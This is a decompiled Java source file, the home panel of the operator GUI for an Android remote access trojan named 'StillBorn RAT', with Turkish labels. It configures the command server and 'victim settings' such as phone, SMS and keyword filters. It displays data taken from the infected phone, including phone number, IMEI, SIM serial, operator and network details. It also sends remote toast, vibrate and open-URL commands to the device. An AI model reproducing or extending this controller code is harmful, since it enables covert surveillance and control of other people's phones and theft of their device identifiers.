/*   1:    */ package gui.panel;
/*   2:    */ 
/*   3:    */ import Packet.AdvancedInformationPacket;
/*   4:    */ import gui.GUI;
/*   5:    */ import gui.UserGUI;
/*   6:    */ import java.awt.event.ActionEvent;
/*   7:    */ import java.awt.event.ActionListener;
/*   8:    */ import java.awt.event.MouseAdapter;
/*   9:    */ import java.awt.event.MouseEvent;
/*  10:    */ import java.util.ArrayList;
/*  11:    */ import java.util.Iterator;
/*  12:    */ import javax.swing.GroupLayout;
/*  13:    */ import javax.swing.GroupLayout.Alignment;
/*  14:    */ import javax.swing.GroupLayout.ParallelGroup;
/*  15:    */ import javax.swing.GroupLayout.SequentialGroup;
/*  16:    */ import javax.swing.JButton;
/*  17:    */ import javax.swing.JCheckBox;
/*  18:    */ import javax.swing.JLabel;
/*  19:    */ import javax.swing.JPanel;
/*  20:    */ import javax.swing.JScrollPane;
/*  21:    */ import javax.swing.JTextArea;
/*  22:    */ import javax.swing.JTextField;
/*  23:    */ import javax.swing.LayoutStyle.ComponentPlacement;
/*  24:    */ import javax.swing.UIManager;
/*  25:    */ import javax.swing.border.TitledBorder;
/*  26:    */ 
/*  27:    */ public class HomePanel
/*  28:    */   extends JPanel
/*  29:    */ {
/*  30:    */   private UserGUI gui;
/*  31:    */   private JTextField ipField;
/*  32:    */   private JTextField portField;
/*  33:    */   private JTextArea textArea;
/*  34:    */   private JTextArea areaPhones;
/*  35:    */   private JTextArea areaSMS;
/*  36:    */   private JTextField textField;
/*  37:    */   private JCheckBox chckbxWaitEventTo;
/*  38:    */   private JTextField toastField;
/*  39:    */   private JTextField durationField;
/*  40:    */   private JTextField urlField;
/*  41:    */   
/*  42:    */   public HomePanel(UserGUI gui)
/*  43:    */   {
/*  44: 69 */     this.gui = gui;
/*  45:    */     
/*  46: 71 */     JPanel panel = new JPanel();
/*  47: 72 */     panel.setBorder(new TitledBorder(null, "Bilgiler", 4, 2, null, null));
/*  48:    */     
/*  49: 74 */     JPanel panel_1 = new JPanel();
/*  50: 75 */     panel_1.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Hızlı işlemler", 4, 2, null, null));
/*  51:    */     
/*  52: 77 */     JPanel panel_2 = new JPanel();
/*  53: 78 */     panel_2.setBorder(new TitledBorder(null, "Kurban ayarları", 4, 2, null, null));
/*  54: 79 */     GroupLayout groupLayout = new GroupLayout(this);
/*  55: 80 */     groupLayout.setHorizontalGroup(
/*  56: 81 */       groupLayout.createParallelGroup(GroupLayout.Alignment.LEADING)
/*  57: 82 */       .addGroup(groupLayout.createSequentialGroup()
/*  58: 83 */       .addContainerGap()
/*  59: 84 */       .addComponent(panel, -2, 327, -2)
/*  60: 85 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/*  61: 86 */       .addGroup(groupLayout.createParallelGroup(GroupLayout.Alignment.TRAILING)
/*  62: 87 */       .addComponent(panel_1, -1, 279, 32767)
/*  63: 88 */       .addComponent(panel_2, -1, 279, 32767))
/*  64: 89 */       .addGap(18)));
/*  65:    */     
/*  66: 91 */     groupLayout.setVerticalGroup(
/*  67: 92 */       groupLayout.createParallelGroup(GroupLayout.Alignment.LEADING)
/*  68: 93 */       .addGroup(groupLayout.createSequentialGroup()
/*  69: 94 */       .addContainerGap()
/*  70: 95 */       .addGroup(groupLayout.createParallelGroup(GroupLayout.Alignment.LEADING)
/*  71: 96 */       .addComponent(panel, -1, 399, 32767)
/*  72: 97 */       .addGroup(groupLayout.createSequentialGroup()
/*  73: 98 */       .addComponent(panel_2, -2, 251, -2)
/*  74: 99 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/*  75:100 */       .addComponent(panel_1, -2, 142, 32767)))
/*  76:101 */       .addContainerGap()));
/*  77:    */     
/*  78:    */ 
/*  79:104 */     JLabel lblWhitephones = new JLabel("Telefonlar :");
/*  80:    */     
/*  81:106 */     JLabel lblWhitesms = new JLabel("SMS :");
/*  82:    */     
/*  83:108 */     JLabel lblNeededKeyword = new JLabel("Anahtar sözcükler :");
/*  84:    */     
/*  85:110 */     this.textField = new JTextField();
/*  86:111 */     this.textField.setColumns(10);
/*  87:    */     
/*  88:113 */     this.areaPhones = new JTextArea();
/*  89:    */     
/*  90:115 */     this.areaSMS = new JTextArea();
/*  91:    */     
/*  92:117 */     JLabel lblServerIp = new JLabel("Server IP :");
/*  93:    */     
/*  94:119 */     this.ipField = new JTextField();
/*  95:120 */     this.ipField.setHorizontalAlignment(2);
/*  96:121 */     this.ipField.setText("192.168.1.10");
/*  97:122 */     this.ipField.setColumns(10);
/*  98:    */     
/*  99:124 */     JLabel lblServerPort = new JLabel("Server Portu :");
/* 100:    */     
/* 101:126 */     this.portField = new JTextField();
/* 102:127 */     this.portField.setText("5555");
/* 103:128 */     this.portField.setHorizontalAlignment(2);
/* 104:129 */     this.portField.setColumns(10);
/* 105:    */     
/* 106:131 */     this.chckbxWaitEventTo = new JCheckBox("Bağlantı için bekle");
/* 107:    */     
/* 108:133 */     JButton btnSaveConnectionInfo = new JButton("Ayarları kaydet");
/* 109:134 */     btnSaveConnectionInfo.addActionListener(new ActionListener()
/* 110:    */     {
/* 111:    */       public void actionPerformed(ActionEvent e)
/* 112:    */       {
/* 113:136 */         HomePanel.this.fireButtonSaveConnectionConfig();
/* 114:    */       }
/* 115:138 */     });
/* 116:139 */     GroupLayout gl_panel_2 = new GroupLayout(panel_2);
/* 117:140 */     gl_panel_2.setHorizontalGroup(
/* 118:141 */       gl_panel_2.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 119:142 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 120:143 */       .addContainerGap()
/* 121:144 */       .addGroup(gl_panel_2.createParallelGroup(GroupLayout.Alignment.TRAILING)
/* 122:145 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 123:146 */       .addGroup(gl_panel_2.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 124:147 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 125:148 */       .addComponent(lblWhitephones, -2, 70, -2)
/* 126:149 */       .addGap(4)
/* 127:150 */       .addComponent(this.areaPhones, -1, 171, 32767))
/* 128:151 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 129:152 */       .addComponent(lblNeededKeyword)
/* 130:153 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 131:154 */       .addComponent(this.textField, -1, 98, 32767))
/* 132:155 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 133:156 */       .addComponent(lblWhitesms)
/* 134:157 */       .addGap(18)
/* 135:158 */       .addComponent(this.areaSMS, -1, 188, 32767))
/* 136:159 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 137:160 */       .addComponent(lblServerIp)
/* 138:161 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 139:162 */       .addComponent(this.ipField, -1, 161, 32767))
/* 140:163 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 141:164 */       .addComponent(lblServerPort)
/* 142:165 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 143:166 */       .addComponent(this.portField, -1, 144, 32767)))
/* 144:167 */       .addContainerGap())
/* 145:168 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 146:169 */       .addGap(40)
/* 147:170 */       .addComponent(btnSaveConnectionInfo)
/* 148:171 */       .addGap(50))
/* 149:172 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 150:173 */       .addComponent(this.chckbxWaitEventTo)
/* 151:174 */       .addContainerGap(76, 32767)))));
/* 152:    */     
/* 153:176 */     gl_panel_2.setVerticalGroup(
/* 154:177 */       gl_panel_2.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 155:178 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 156:179 */       .addContainerGap()
/* 157:180 */       .addGroup(gl_panel_2.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 158:181 */       .addComponent(lblWhitephones, -2, 44, -2)
/* 159:182 */       .addComponent(this.areaPhones, -2, 38, -2))
/* 160:183 */       .addGroup(gl_panel_2.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 161:184 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 162:185 */       .addGap(18)
/* 163:186 */       .addComponent(lblWhitesms)
/* 164:187 */       .addGap(12))
/* 165:188 */       .addGroup(gl_panel_2.createSequentialGroup()
/* 166:189 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 167:190 */       .addComponent(this.areaSMS, -1, 33, 32767)
/* 168:191 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)))
/* 169:192 */       .addGroup(gl_panel_2.createParallelGroup(GroupLayout.Alignment.BASELINE)
/* 170:193 */       .addComponent(lblNeededKeyword)
/* 171:194 */       .addComponent(this.textField, -2, -1, -2))
/* 172:195 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 173:196 */       .addGroup(gl_panel_2.createParallelGroup(GroupLayout.Alignment.BASELINE)
/* 174:197 */       .addComponent(this.ipField, -2, -1, -2)
/* 175:198 */       .addComponent(lblServerIp))
/* 176:199 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 177:200 */       .addGroup(gl_panel_2.createParallelGroup(GroupLayout.Alignment.BASELINE)
/* 178:201 */       .addComponent(this.portField, -2, -1, -2)
/* 179:202 */       .addComponent(lblServerPort))
/* 180:203 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 181:204 */       .addComponent(this.chckbxWaitEventTo)
/* 182:205 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 183:206 */       .addComponent(btnSaveConnectionInfo)
/* 184:207 */       .addGap(31)));
/* 185:    */     
/* 186:209 */     panel_2.setLayout(gl_panel_2);
/* 187:    */     
/* 188:211 */     JScrollPane scrollPane = new JScrollPane();
/* 189:    */     
/* 190:213 */     JButton btnNewButton = new JButton("Yenile");
/* 191:214 */     btnNewButton.addActionListener(new ActionListener()
/* 192:    */     {
/* 193:    */       public void actionPerformed(ActionEvent arg0)
/* 194:    */       {
/* 195:216 */         HomePanel.this.fireButtonRefreshAdv();
/* 196:    */       }
/* 197:218 */     });
/* 198:219 */     GroupLayout gl_panel = new GroupLayout(panel);
/* 199:220 */     gl_panel.setHorizontalGroup(
/* 200:221 */       gl_panel.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 201:222 */       .addGroup(gl_panel.createSequentialGroup()
/* 202:223 */       .addGroup(gl_panel.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 203:224 */       .addGroup(gl_panel.createSequentialGroup()
/* 204:225 */       .addContainerGap()
/* 205:226 */       .addComponent(scrollPane, -1, 293, 32767))
/* 206:227 */       .addGroup(gl_panel.createSequentialGroup()
/* 207:228 */       .addGap(113)
/* 208:229 */       .addComponent(btnNewButton)))
/* 209:230 */       .addContainerGap()));
/* 210:    */     
/* 211:232 */     gl_panel.setVerticalGroup(
/* 212:233 */       gl_panel.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 213:234 */       .addGroup(gl_panel.createSequentialGroup()
/* 214:235 */       .addContainerGap()
/* 215:236 */       .addComponent(scrollPane, -1, 356, 32767)
/* 216:237 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 217:238 */       .addComponent(btnNewButton)));
/* 218:    */     
/* 219:    */ 
/* 220:241 */     this.textArea = new JTextArea();
/* 221:242 */     scrollPane.setViewportView(this.textArea);
/* 222:243 */     panel.setLayout(gl_panel);
/* 223:    */     
/* 224:245 */     this.toastField = new JTextField();
/* 225:246 */     this.toastField.setColumns(10);
/* 226:    */     
/* 227:248 */     JButton btnToastIt = new JButton("Toast Mesaj Gönder");
/* 228:249 */     btnToastIt.addMouseListener(new MouseAdapter()
/* 229:    */     {
/* 230:    */       public void mouseClicked(MouseEvent e)
/* 231:    */       {
/* 232:252 */         HomePanel.this.fireButtonToast();
/* 233:    */       }
/* 234:255 */     });
/* 235:256 */     JButton btnVibrate = new JButton("Telefonu Titret");
/* 236:257 */     btnVibrate.addMouseListener(new MouseAdapter()
/* 237:    */     {
/* 238:    */       public void mouseClicked(MouseEvent e)
/* 239:    */       {
/* 240:260 */         HomePanel.this.fireButtonVibrate();
/* 241:    */       }
/* 242:263 */     });
/* 243:264 */     this.durationField = new JTextField();
/* 244:265 */     this.durationField.setColumns(10);
/* 245:    */     
/* 246:267 */     JLabel lblDuration = new JLabel("Süre(ms) : ");
/* 247:    */     
/* 248:269 */     JLabel lblOpenUrl = new JLabel("Site URL :");
/* 249:    */     
/* 250:271 */     this.urlField = new JTextField();
/* 251:272 */     this.urlField.setColumns(10);
/* 252:    */     
/* 253:274 */     JButton btnBrowseIt = new JButton("Siteyi aç");
/* 254:275 */     btnBrowseIt.addMouseListener(new MouseAdapter()
/* 255:    */     {
/* 256:    */       public void mouseClicked(MouseEvent e)
/* 257:    */       {
/* 258:278 */         HomePanel.this.fireButtonBrowse();
/* 259:    */       }
/* 260:280 */     });
/* 261:281 */     GroupLayout gl_panel_1 = new GroupLayout(panel_1);
/* 262:282 */     gl_panel_1.setHorizontalGroup(
/* 263:283 */       gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 264:284 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 265:285 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 266:286 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 267:287 */       .addContainerGap()
/* 268:288 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 269:289 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 270:290 */       .addComponent(this.toastField, -1, 151, 32767)
/* 271:291 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 272:292 */       .addComponent(btnToastIt))
/* 273:293 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 274:294 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 275:295 */       .addComponent(lblOpenUrl)
/* 276:296 */       .addComponent(lblDuration))
/* 277:297 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 278:298 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.TRAILING)
/* 279:299 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 280:300 */       .addComponent(this.durationField, -1, 70, 32767)
/* 281:301 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 282:302 */       .addComponent(btnVibrate))
/* 283:303 */       .addComponent(this.urlField, -1, 162, 32767)))))
/* 284:304 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 285:305 */       .addGap(156)
/* 286:306 */       .addComponent(btnBrowseIt, -1, 101, 32767)))
/* 287:307 */       .addContainerGap()));
/* 288:    */     
/* 289:309 */     gl_panel_1.setVerticalGroup(
/* 290:310 */       gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 291:311 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 292:312 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.BASELINE)
/* 293:313 */       .addComponent(this.toastField, -2, 23, -2)
/* 294:314 */       .addComponent(btnToastIt, -2, 24, -2))
/* 295:315 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 296:316 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.BASELINE)
/* 297:317 */       .addComponent(btnVibrate)
/* 298:318 */       .addComponent(this.durationField, -2, 24, -2)
/* 299:319 */       .addComponent(lblDuration))
/* 300:320 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 301:321 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.BASELINE)
/* 302:322 */       .addComponent(lblOpenUrl)
/* 303:323 */       .addComponent(this.urlField, -2, -1, -2))
/* 304:324 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 305:325 */       .addComponent(btnBrowseIt)
/* 306:326 */       .addContainerGap(-1, 32767)));
/* 307:    */     
/* 308:328 */     panel_1.setLayout(gl_panel_1);
/* 309:329 */     setLayout(groupLayout);
/* 310:    */   }
/* 311:    */   
/* 312:    */   private void fireButtonSaveConnectionConfig()
/* 313:    */   {
/* 314:333 */     ArrayList<String> phones = new ArrayList();
/* 315:334 */     ArrayList<String> sms = new ArrayList();
/* 316:335 */     ArrayList<String> kw = new ArrayList();
/* 317:337 */     for (String phone : this.areaPhones.getText().split("\n")) {
/* 318:337 */       phones.add(phone);
/* 319:    */     }
/* 320:338 */     for (String s : this.areaSMS.getText().split("\n")) {
/* 321:338 */       sms.add(s);
/* 322:    */     }
/* 323:339 */     for (String key : this.textField.getText().split(" ")) {
/* 324:339 */       kw.add(key);
/* 325:    */     }
/* 326:341 */     this.gui.fireSaveConnectConfigurations(this.ipField.getText(), Integer.valueOf(this.portField.getText()).intValue(), this.chckbxWaitEventTo.isSelected(), phones, sms, kw);
/* 327:    */   }
/* 328:    */   
/* 329:    */   private void fireButtonToast()
/* 330:    */   {
/* 331:345 */     String mess = this.toastField.getText();
/* 332:346 */     this.gui.getGUI().fireToastMessage(this.gui.getImei(), mess);
/* 333:    */   }
/* 334:    */   
/* 335:    */   private void fireButtonVibrate()
/* 336:    */   {
/* 337:350 */     String value = this.durationField.getText();
/* 338:351 */     long l = Long.valueOf(value).longValue();
/* 339:352 */     this.gui.getGUI().fireVibrate(this.gui.getImei(), Long.valueOf(l));
/* 340:    */   }
/* 341:    */   
/* 342:    */   private void fireButtonBrowse()
/* 343:    */   {
/* 344:356 */     this.gui.getGUI().fireBrowseUrl(this.gui.getImei(), this.urlField.getText());
/* 345:    */   }
/* 346:    */   
/* 347:    */   public void updatePreferences(String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw)
/* 348:    */   {
/* 349:360 */     String temp = "";
/* 350:    */     Iterator localIterator;
/* 351:361 */     if (phones != null)
/* 352:    */     {
/* 353:    */       String s;
/* 354:362 */       for (localIterator = phones.iterator(); localIterator.hasNext(); temp = temp + s + "\n") {
/* 355:362 */         s = (String)localIterator.next();
/* 356:    */       }
/* 357:    */     }
/* 358:364 */     this.areaPhones.setText(temp);
/* 359:    */     
/* 360:366 */     temp = "";
/* 361:367 */     if (sms != null)
/* 362:    */     {
/* 363:    */       String s;
/* 364:368 */       for (localIterator = sms.iterator(); localIterator.hasNext(); temp = temp + s + "\n") {
/* 365:368 */         s = (String)localIterator.next();
/* 366:    */       }
/* 367:    */     }
/* 368:370 */     this.areaSMS.setText(temp);
/* 369:    */     
/* 370:372 */     temp = "";
/* 371:373 */     if (kw != null)
/* 372:    */     {
/* 373:    */       String s;
/* 374:374 */       for (localIterator = kw.iterator(); localIterator.hasNext(); temp = temp + s + " ") {
/* 375:374 */         s = (String)localIterator.next();
/* 376:    */       }
/* 377:375 */       temp = temp.substring(0, temp.length() - 2);
/* 378:    */     }
/* 379:377 */     this.textField.setText(temp);
/* 380:    */     
/* 381:379 */     this.ipField.setText(ip);
/* 382:380 */     this.portField.setText(port);
/* 383:381 */     this.chckbxWaitEventTo.setSelected(wait);
/* 384:    */   }
/* 385:    */   
/* 386:    */   private void fireButtonRefreshAdv()
/* 387:    */   {
/* 388:385 */     this.textArea.setText("");
/* 389:386 */     this.gui.fireGetAdvancedInformations();
/* 390:    */   }
/* 391:    */   
/* 392:    */   public void updateInformations(AdvancedInformationPacket packet)
/* 393:    */   {
/* 394:390 */     String txt = "";
/* 395:    */     
/* 396:392 */     txt = txt + " - Genel bilgiler :\n";
/* 397:393 */     txt = txt + "Tel. No. = " + packet.getPhoneNumber() + "\n";
/* 398:394 */     txt = txt + "IMEI = " + packet.getIMEI() + "\n";
/* 399:395 */     txt = txt + "Software version = " + packet.getSoftwareVersion() + "\n";
/* 400:396 */     txt = txt + "Ülke = " + packet.getCountryCode() + "\n";
/* 401:397 */     txt = txt + "Operatör (ismi) = " + packet.getOperatorName() + "\n";
/* 402:398 */     txt = txt + "Operatör (kodu) = " + packet.getOperatorCode() + "\n";
/* 403:399 */     txt = txt + "SIM operatör ismi = " + packet.getSimOperatorName() + "\n";
/* 404:400 */     txt = txt + "SIM operatör kodu = " + packet.getSimOperatorCode() + "\n";
/* 405:401 */     txt = txt + "SIM ülkesi =" + packet.getSimCountryCode() + "\n";
/* 406:402 */     txt = txt + "SIM seri no. =" + packet.getSimSerial() + "\n";
/* 407:    */     
/* 408:404 */     txt = txt + "\n ----------------------------\n\n";
/* 409:    */     
/* 410:406 */     txt = txt + " - Wifi bilgileri :\n";
/* 411:407 */     txt = txt + "Erişilebilir = " + packet.isWifiAvailable() + "\n";
/* 412:408 */     txt = txt + "Bağlı / bağlanıyor = " + packet.isWifiConnectedOrConnecting() + "\n";
/* 413:409 */     txt = txt + "Extra bilgi =" + packet.getWifiExtraInfos() + "\n";
/* 414:410 */     txt = txt + "Sebep = " + packet.getWifiReason() + "\n";
/* 415:    */     
/* 416:412 */     txt = txt + "\n ----------------------------\n\n";
/* 417:    */     
/* 418:414 */     txt = txt + " - Mobil ağ bilgileri :\n";
/* 419:415 */     txt = txt + "İsim = " + packet.getMobileNetworkName() + "\n";
/* 420:416 */     txt = txt + "Erişilebilir = " + packet.isMobileNetworkAvailable() + "\n";
/* 421:417 */     txt = txt + "Bağlı / bağlanıyor = " + packet.isMobileNetworkConnectedOrConnecting() + "\n";
/* 422:418 */     txt = txt + "Extra bilgi = " + packet.getMobileNetworkExtraInfos() + "\n";
/* 423:419 */     txt = txt + "Sebep = " + packet.getMobileNetworkReason() + "\n";
/* 424:    */     
/* 425:421 */     txt = txt + "\n ----------------------------\n\n";
/* 426:    */     
/* 427:423 */     txt = txt + " - Android bilgileri :\n";
/* 428:424 */     txt = txt + "Android versiyonu = " + packet.getAndroidVersion() + "\n";
/* 429:425 */     txt = txt + "SDK Android versiyonu = " + packet.getAndroidSdk() + "\n";
/* 430:    */     
/* 431:427 */     txt = txt + "\n ----------------------------\n\n";
/* 432:    */     
/* 433:429 */     txt = txt + " - Cihazlar :\n";
/* 434:430 */     txt = txt + "Cihaz sayısı = " + packet.getSensors().size() + "\n";
/* 435:431 */     for (String s : packet.getSensors()) {
/* 436:432 */       txt = txt + " --> " + s + "\n";
/* 437:    */     }
/* 438:435 */     txt = txt + "\n ---------stillborn----------\n\n";
/* 439:    */     
/* 440:437 */     txt = txt + " - Batarya bilgisi :\n";
/* 441:438 */     txt = txt + "Mevcut = " + packet.isBatteryPresent();
/* 442:439 */     String[] health = { "", "bilinmiyor", "iyi", "sıcak", "ölü", "yüksek voltaj", "bilinmeyen hata", "soğuk" };
/* 443:440 */     if ((packet.getBatteryHealth() >= 0) && (packet.getBatteryHealth() < 9)) {
/* 444:440 */       txt = txt + "Sağlık = " + health[packet.getBatteryHealth()] + "\n";
/* 445:    */     } else {
/* 446:441 */       txt = txt + "Sağlık = n/a\n";
/* 447:    */     }
/* 448:442 */     txt = txt + "Seviye = " + packet.getBatteryLevel() + "\n";
/* 449:443 */     if (packet.getBatteryPlugged() == 1) {
/* 450:443 */       txt = txt + "Bağlı = Elektrik AC\n";
/* 451:444 */     } else if (packet.getBatteryPlugged() == 2) {
/* 452:444 */       txt = txt + "Bağlı = USB\n";
/* 453:    */     } else {
/* 454:445 */       txt = txt + "Bağlı = n/a\n";
/* 455:    */     }
/* 456:446 */     txt = txt + "Yüzdelik = " + packet.getBatteryScale() + "\n";
/* 457:447 */     String[] status = { "", "bilinmiyor", "şarj ediliyor", "şarj boşaltılıyor", "şarj edilmiyor", "dolu" };
/* 458:448 */     if ((packet.getBatteryStatus() >= 0) && (packet.getBatteryStatus() < 6)) {
/* 459:448 */       txt = txt + "Durum = " + status[packet.getBatteryStatus()] + "\n";
/* 460:    */     } else {
/* 461:449 */       txt = txt + "Durum = bilinmiyor \n";
/* 462:    */     }
/* 463:450 */     txt = txt + "Teknoloji = " + packet.getBatteryTechnology() + "\n";
/* 464:451 */     txt = txt + "Sıcaklık = " + packet.getBatteryTemperature() + "\n";
/* 465:452 */     txt = txt + "Voltaj = " + packet.getBatteryVoltage() + "\n";
/* 466:    */     
/* 467:454 */     this.textArea.setText(txt);
/* 468:    */   }
/* 469:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     gui.panel.HomePanel
 * JD-Core Version:    0.7.0.1
 */